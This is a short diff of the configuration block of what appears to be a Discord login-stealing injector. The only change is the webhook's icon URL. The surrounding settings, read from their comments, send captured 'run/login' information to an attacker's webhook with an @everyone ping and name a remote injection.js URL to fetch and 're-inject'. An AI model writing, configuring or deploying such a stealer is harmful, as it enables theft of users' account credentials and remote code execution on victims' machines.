@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: 'Database', //name of the webhook thats gonna send the info
-  embed_icon: 'https://i.imgur.com/EZFAJXh.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_icon: 'https://media.discordapp.net/attachments/1113588704657809548/1116475098531123220/image.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 00000000, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   injection_url: 'https://raw.githubusercontent.com/crxel/rdimo-injection/main/injection.js', //injection url for when it reinjects
   /**
